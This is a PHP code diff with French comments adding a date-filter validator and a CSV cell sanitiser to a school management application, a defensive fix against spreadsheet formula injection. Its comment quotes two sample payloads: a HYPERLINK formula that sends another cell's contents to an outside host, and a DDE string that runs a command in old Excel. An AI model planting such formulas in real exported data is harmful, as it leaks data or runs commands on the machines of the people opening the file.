@@ -272,3 +272,82 @@ function now(): string
 {
     return date('Y-m-d H:i:s');
 }
+
+/**
+ * Une date de filtre au format `Y-m-d`, ou `null` si elle n'est pas
+ * exploitable.
+ *
+ * POURQUOI ELLE VIT DANS LE NOYAU
+ * ================================
+ * Elle est née dans le module Journal, après qu'une saisie invalide eut
+ * fait répondre 500 à l'écran (`strtotime()` rend `false`, `date()` le
+ * refuse en PHP 8) et qu'une autre eut silencieusement vidé la liste.
+ * Le module Rapports en avait besoin à l'identique : deux copies de la
+ * même règle divergent toujours, et c'est la plus laxiste qu'on finit
+ * par emprunter.
+ *
+ * On exige la FORME exacte ET une date qui existe : `checkdate` refuse
+ * le 31 février, que `strtotime` reporterait au 3 mars sans rien dire.
+ *
+ *   > Un filtre qu'on n'a pas compris ne doit ni planter ni répondre
+ *   > « rien » : il doit être ignoré.
+ */
+function date_filtre(mixed $valeur): ?string
+{
+    $texte = trim((string) $valeur);
+
+    if ($texte === '' || preg_match('/^\d{4}-\d{2}-\d{2}$/', $texte) !== 1) {
+        return null;
+    }
+
+    [$annee, $mois, $jour] = array_map('intval', explode('-', $texte));
+
+    return checkdate($mois, $jour, $annee) ? $texte : null;
+}
+
+/**
+ * Neutralise une cellule avant de l'écrire dans un CSV.
+ *
+ * POURQUOI C'EST UNE QUESTION DE SÉCURITÉ, PAS DE MISE EN FORME
+ * =============================================================
+ * Excel et LibreOffice interprètent comme une FORMULE toute cellule qui
+ * commence par `=`, `+`, `-`, `@`, une tabulation ou un retour chariot.
+ * Le guillemet du CSV n'y change rien : `"=1+1"` est évalué.
+ *
+ * Or les noms de classes, d'élèves et d'établissements sont saisis par
+ * l'école. Un secrétariat — ou quiconque obtient un compte de saisie —
+ * peut nommer une classe :
+ *
+ *     =HYPERLINK("http://ailleurs.cd?d="&A1;"Cliquez")
+ *
+ * Le directeur exporte les effectifs, ouvre le fichier, clique : le
+ * contenu d'une autre cellule part chez un tiers. Avec les anciennes
+ * versions d'Excel, `=cmd|'/c calc'!A1` exécute une commande.
+ *
+ *   > Une donnée saisie par un utilisateur et rendue dans un tableur
+ *   > n'est pas du texte : c'est du code tant qu'on ne l'a pas désarmé.
+ *
+ * LA NEUTRALISATION ÉPARGNE LES NOMBRES.
+ * Préfixer `-1250,00` en ferait du texte, et la colonne ne s'additionnerait
+ * plus dans Excel — on casserait le fichier pour se protéger d'un danger
+ * qui n'existe pas sur un nombre. Un nombre reste donc un nombre.
+ *
+ * L'apostrophe de tête est le marqueur « texte » du tableur : Excel ne
+ * l'affiche pas dans la cellule.
+ */
+function csv_safe_cell(mixed $valeur): string
+{
+    $texte = (string) $valeur;
+
+    if ($texte === '') {
+        return $texte;
+    }
+
+    // Un nombre — à la française ou à l'anglaise — n'est jamais une
+    // formule, et doit rester additionnable.
+    if (preg_match('/^-?\d+([.,]\d+)?$/', $texte) === 1) {
+        return $texte;
+    }
+
+    return preg_match('/^[=+\-@\t\r]/', $texte) === 1 ? "'" . $texte : $texte;
+}
